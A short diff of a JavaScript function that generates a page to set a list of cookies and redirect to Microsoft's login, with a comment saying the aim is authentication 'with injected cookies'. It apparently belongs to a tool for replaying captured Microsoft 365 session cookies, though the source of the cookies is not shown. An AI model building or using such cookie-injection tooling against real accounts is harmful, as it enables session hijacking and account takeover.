@@ -283,15 +283,10 @@ function generateRedirectPage(cookies, clientId, tenant, tokenId, jwtToken) {
   html += '      setStatus("Set " + count + " cookies. Redirecting to Microsoft Office...", "success");\n';
   html += '      detailsEl.innerHTML += "<p>Cookies set: " + count + "</p>";\n\n';
 
-  // Redirect to Microsoft with tenant-specific client_id
+  // Redirect to Microsoft login page to authenticate with injected cookies
   html += '      setTimeout(function() {\n';
-  html += '        var msUrl = "https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?";\n';
-  html += '        msUrl += "client_id=' + clientId + '";\n';
-  html += '        msUrl += "&redirect_uri=https://www.office.com/";\n';
-  html += '        msUrl += "&response_type=code";\n';
-  html += '        msUrl += "&scope=openid%20profile%20email";\n';
-  html += '        window.location.href = msUrl;\n';
-  html += '      }, 1000);\n';
+  html += '        window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  html += '      }, 800);\n';
   html += '    }\n\n';
 
   // Status helper
